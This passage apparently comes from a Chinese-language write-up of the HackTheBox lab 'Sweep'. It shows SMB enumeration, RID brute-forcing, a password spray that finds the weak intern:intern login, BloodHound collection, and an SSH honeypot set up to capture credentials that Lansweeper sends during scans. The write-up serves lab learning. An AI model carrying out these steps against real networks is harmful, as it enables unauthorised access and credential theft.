+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>Lansweeper Secure Website
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:localhost, DNS:localhost, DNS:localhost
+</span></span><span style="display:flex;"><span>| Not valid before: 2021-11-21T09:22:27
+</span></span><span style="display:flex;"><span>|_Not valid after:  2121-12-21T09:22:27
+</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 68.95 seconds
+</span></span></code></pre></div><p>是个很兼容域控的管理平台，没有枚举到存在默认界面或者可以利用的历史漏洞</p>
+<p>检查匿名特权</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sweep<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc smb <span style="color:#e6db74">&#34;</span>$ip<span style="color:#e6db74">&#34;</span> -u guest -p <span style="color:#e6db74">&#39;&#39;</span> --shares
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:INVENTORY<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domin:sweep.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sweep.vl<span style="color:#ae81ff">\g</span>uest: 
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumerated shares
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        Share           Permissions     Remark
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        -----           -----------     ------
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        ADMIN$                          Remote Admin
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        C$                              Default share
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        DefaultPackageShare$ READ            Lansweeper PackageShare
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        IPC$            READ            Remote IPC
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        Lansweeper$                     Lansweeper Actions
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        NETLOGON                        Logon server share 
+</span></span></code></pre></div><p>smb存在匿名，DefaultPackageShare$特殊目录当中只有一张图片</p>
+<p><img src="/sweep/image.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>元数据没有信息，既然有匿名权限则rid爆破</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sweep<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc smb $ip -u guest -p <span style="color:#e6db74">&#39;&#39;</span> --rid-brute
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:INVENTORY<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domin:sweep.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sweep.vl<span style="color:#ae81ff">\g</span>uest: 
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        498: SWEEP<span style="color:#ae81ff">\E</span>nterprise Read-only Domain Controllers <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        500: SWEEP<span style="color:#ae81ff">\A</span>dministrator <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        501: SWEEP<span style="color:#ae81ff">\G</span>uest <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        502: SWEEP<span style="color:#ae81ff">\k</span>rbtgt <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        512: SWEEP<span style="color:#ae81ff">\D</span>omain Admins <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        513: SWEEP<span style="color:#ae81ff">\D</span>omain Users <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        514: SWEEP<span style="color:#ae81ff">\D</span>omain Guests <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        515: SWEEP<span style="color:#ae81ff">\D</span>omain Computers <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        516: SWEEP<span style="color:#ae81ff">\D</span>omain Controllers <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        517: SWEEP<span style="color:#ae81ff">\C</span>ert Publishers <span style="color:#f92672">(</span>SidTypeAlias<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        518: SWEEP<span style="color:#ae81ff">\S</span>chema Admins <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        519: SWEEP<span style="color:#ae81ff">\E</span>nterprise Admins <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        520: SWEEP<span style="color:#ae81ff">\G</span>roup Policy Creator Owners <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        521: SWEEP<span style="color:#ae81ff">\R</span>ead-only Domain Controllers <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        522: SWEEP<span style="color:#ae81ff">\C</span>loneable Domain Controllers <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        525: SWEEP<span style="color:#ae81ff">\P</span>rotected Users <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        526: SWEEP<span style="color:#ae81ff">\K</span>ey Admins <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        527: SWEEP<span style="color:#ae81ff">\E</span>nterprise Key Admins <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        553: SWEEP<span style="color:#ae81ff">\R</span>AS and IAS Servers <span style="color:#f92672">(</span>SidTypeAlias<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        571: SWEEP<span style="color:#ae81ff">\A</span>llowed RODC Password Replication Group <span style="color:#f92672">(</span>SidTypeAlias<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        572: SWEEP<span style="color:#ae81ff">\D</span>enied RODC Password Replication Group <span style="color:#f92672">(</span>SidTypeAlias<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        1000: SWEEP<span style="color:#ae81ff">\I</span>NVENTORY$ <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        1101: SWEEP<span style="color:#ae81ff">\D</span>nsAdmins <span style="color:#f92672">(</span>SidTypeAlias<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        1102: SWEEP<span style="color:#ae81ff">\D</span>nsUpdateProxy <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        1103: SWEEP<span style="color:#ae81ff">\L</span>answeeper Admins <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        1113: SWEEP<span style="color:#ae81ff">\j</span>gre808 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        1114: SWEEP<span style="color:#ae81ff">\b</span>cla614 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        1115: SWEEP<span style="color:#ae81ff">\h</span>mar648 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        1116: SWEEP<span style="color:#ae81ff">\j</span>gar931 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        1117: SWEEP<span style="color:#ae81ff">\f</span>cla801 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        1118: SWEEP<span style="color:#ae81ff">\j</span>wil197 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        1119: SWEEP<span style="color:#ae81ff">\g</span>rob171 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        1120: SWEEP<span style="color:#ae81ff">\f</span>dav736 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        1121: SWEEP<span style="color:#ae81ff">\j</span>smi791 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        1122: SWEEP<span style="color:#ae81ff">\h</span>joh690 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        1123: SWEEP<span style="color:#ae81ff">\s</span>vc_inventory_win <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        1124: SWEEP<span style="color:#ae81ff">\s</span>vc_inventory_lnx <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        1125: SWEEP<span style="color:#ae81ff">\i</span>ntern <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        3101: SWEEP<span style="color:#ae81ff">\L</span>answeeper Discovery <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>提取用户名字典</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>Administrator
+</span></span><span style="display:flex;"><span>Guest
+</span></span><span style="display:flex;"><span>krbtgt
+</span></span><span style="display:flex;"><span>INVENTORY$
+</span></span><span style="display:flex;"><span>jgre808
+</span></span><span style="display:flex;"><span>bcla614
+</span></span><span style="display:flex;"><span>hmar648
+</span></span><span style="display:flex;"><span>jgar931
+</span></span><span style="display:flex;"><span>fcla801
+</span></span><span style="display:flex;"><span>jwil197
+</span></span><span style="display:flex;"><span>grob171
+</span></span><span style="display:flex;"><span>fdav736
+</span></span><span style="display:flex;"><span>jsmi791
+</span></span><span style="display:flex;"><span>hjoh690
+</span></span><span style="display:flex;"><span>svc_inventory_win
+</span></span><span style="display:flex;"><span>svc_inventory_lnx
+</span></span><span style="display:flex;"><span>intern
+</span></span></code></pre></div><p>无预认证不存在，尝试爆破同用户密码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sweep<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc smb $ip -u users -p users 
+</span></span><span style="display:flex;"><span>·················
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> sweep.vl<span style="color:#ae81ff">\j</span>wil197:intern SessionError 
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> sweep.vl<span style="color:#ae81ff">\g</span>rob171:intern SessionError 
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> sweep.vl<span style="color:#ae81ff">\f</span>dav736:intern SessionError 
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> sweep.vl<span style="color:#ae81ff">\j</span>smi791:intern SessionError 
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> sweep.vl<span style="color:#ae81ff">\h</span>joh690:intern SessionError 
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> sweep.vl<span style="color:#ae81ff">\s</span>vc_inventory_win:intern SessionError 
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> sweep.vl<span style="color:#ae81ff">\s</span>vc_inventory_lnx:intern SessionError 
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sweep.vl<span style="color:#ae81ff">\i</span>ntern:intern
+</span></span></code></pre></div><p>在爆破了两分钟后获得用户intern的凭证信息</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sweep<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo user<span style="color:#f92672">=</span>intern&gt;&gt;start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sweep<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo pass<span style="color:#f92672">=</span>intern&gt;&gt;start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sweep<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ . start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sweep<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc smb $ip -u $user -p $user --shares
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:INVENTORY<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domin:sweep.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sweep.vl<span style="color:#ae81ff">\i</span>ntern:intern 
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumerated shares
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        Share           Permissions     Remark
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        -----           -----------     ------
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        ADMIN$                          Remote Admin
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        C$                              Default share
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        DefaultPackageShare$ READ            Lansweeper PackageShare
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        IPC$            READ            Remote IPC
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        Lansweeper$     READ            Lansweeper Actions
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        NETLOGON        READ            Logon server share 
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        SYSVOL          READ            Logon server share 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sweep<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc winrm $ip -u $user -p $user
+</span></span><span style="display:flex;"><span>WINRM       10.129.203.20   <span style="color:#ae81ff">5985</span>   INVENTORY        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:INVENTORY<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:sweep.vl<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span>WINRM       10.129.203.20   <span style="color:#ae81ff">5985</span>   INVENTORY        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> sweep.vl<span style="color:#ae81ff">\i</span>ntern:intern
+</span></span></code></pre></div><p>没有winrm权限，新权限能查看的Lansweeper$目录并没有有意思的内容，放猎犬</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sweep<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ bloodhound-python -d $domain -c ALL -u $user -p $pass -ns $ip --zip
+</span></span><span style="display:flex;"><span>INFO: BloodHound.py <span style="color:#66d9ef">for</span> BloodHound LEGACY <span style="color:#f92672">(</span>BloodHound 4.2 and 4.3<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>INFO: Found AD domain: sweep.vl
+</span></span><span style="display:flex;"><span>INFO: Getting TGT <span style="color:#66d9ef">for</span> user
+</span></span><span style="display:flex;"><span>INFO: Connecting to LDAP server: inventory.sweep.vl
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">1</span> domains
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">1</span> domains in the forest
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">1</span> computers
+</span></span><span style="display:flex;"><span>INFO: Connecting to LDAP server: inventory.sweep.vl
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">17</span> users
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">54</span> groups
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">2</span> gpos
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">3</span> ous
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">19</span> containers
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">0</span> trusts
+</span></span><span style="display:flex;"><span>INFO: Starting computer enumeration with <span style="color:#ae81ff">10</span> workers
+</span></span><span style="display:flex;"><span>INFO: Querying computer: inventory.sweep.vl
+</span></span><span style="display:flex;"><span>INFO: Done in 00M 49S
+</span></span><span style="display:flex;"><span>INFO: Compressing output into 20250827100014_bloodhound.zip
+</span></span></code></pre></div><p>这个用户没有出站，但是能看到有个额外的域管，或许后面会有用</p>
+<p><img src="/sweep/image-1.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<h2 id="ssh蜜罐">ssh蜜罐
+</h2><p>这个用户局外没什么用了，用来登陆管理平台试试</p>
+<p><img src="/sweep/image-2.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>这个用户并不够权限执行我枚举到的后台shell利用</p>
+<p><img src="/sweep/image-3.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>在上方的扫描凭据接口，我找到了一些凭据，但是都通过加密，需要凭据验证</p>
+<p><a class="link" href="https://www.reddit.com/r/sysadmin/comments/926gfu/lansweeper_credentialssecurity_question/?tl=zh-hans"  target="_blank" rel="noopener"
+    >reddit</a>的这个用户发言让我理解了该做什么，Lansweeper 将使用 Kerberos 身份验证，这样凭据本身就不会被发送到被扫描的计算机，但是 Linux 不具备这种配置，它所作的只是利用我们指定的凭据进行ssh登陆而已，所以我们可以配置一个蜜罐用于劫持登陆</p>
+<p>这是个小型的ssh蜜罐</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>https://github.com/jaksi/sshesame
+</span></span></code></pre></div><p>我们将沙箱配置在2222端口上，因为靶机已经提示了配置了22的防火墙</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sweep<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ vim server.conf
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sweep<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat server.conf 
+</span></span><span style="display:flex;"><span>server:
+</span></span><span style="display:flex;"><span>  listen_address: 10.10.16.22:2222
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sweep<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ./sshesame-linux-amd64 --config server.conf 
+</span></span><span style="display:flex;"><span>INFO 2025/08/27 10:23:01 No host keys configured, using keys at <span style="color:#e6db74">&#34;/home/wackymaker/.local/share/sshesame&#34;</span>
+</span></span><span style="display:flex;"><span>INFO 2025/08/27 10:23:01 Host key <span style="color:#e6db74">&#34;/home/wackymaker/.local/share/sshesame/host_rsa_key&#34;</span> not found, generating it
+</span></span><span style="display:flex;"><span>INFO 2025/08/27 10:23:01 Host key <span style="color:#e6db74">&#34;/home/wackymaker/.local/share/sshesame/host_ecdsa_key&#34;</span> not found, generating it
+</span></span><span style="display:flex;"><span>INFO 2025/08/27 10:23:01 Host key <span style="color:#e6db74">&#34;/home/wackymaker/.local/share/sshesame/host_ed25519_key&#34;</span> not found, generating it
+</span></span><span style="display:flex;"><span>INFO 2025/08/27 10:23:01 Listening on 10.10.16.22:2222
+</span></span></code></pre></div><p>在扫描凭证-添加扫描目标中，选择扫描ip范围，选定我们蜜罐的范围，并选择2222端口（只显示22是因为它只显示两位数字）</p>
+<p><img src="/sweep/image-4.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
